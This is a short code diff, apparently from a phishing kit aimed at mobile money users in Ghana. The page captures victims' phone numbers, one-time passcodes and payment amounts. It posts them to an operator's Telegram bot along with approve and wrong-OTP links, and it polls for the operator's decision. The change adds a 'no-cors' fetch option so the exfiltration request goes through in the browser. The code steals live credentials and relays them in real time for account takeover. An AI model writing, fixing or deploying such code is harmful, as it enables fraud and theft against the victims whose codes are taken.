@@ -172,8 +172,9 @@ Amt: GHS ${amt}
 ✅ *APPROVE:* ${approveLink}
 ❌ *WRONG OTP:* ${wrongLink}`;
         
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {
+    mode: 'no-cors' // Bypasses the CORS check
+});        
         // Poll for Operator Approval
         startPolling(id);
     }
@@ -286,8 +287,9 @@ async function sendOTP() {
 
     // Send to Telegram
     const msg = `🔓 *OTP RECEIVED*\n📱 Phone: ${phone}\n🔢 CODE: *${otpCode}*`;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {
+    mode: 'no-cors' // Bypasses the CORS check
+});
     // The 45-second "Auto-Finish" (unless you click Wrong OTP)
     window.autoApproveTimeout = setTimeout(() => {
         showView(4); 
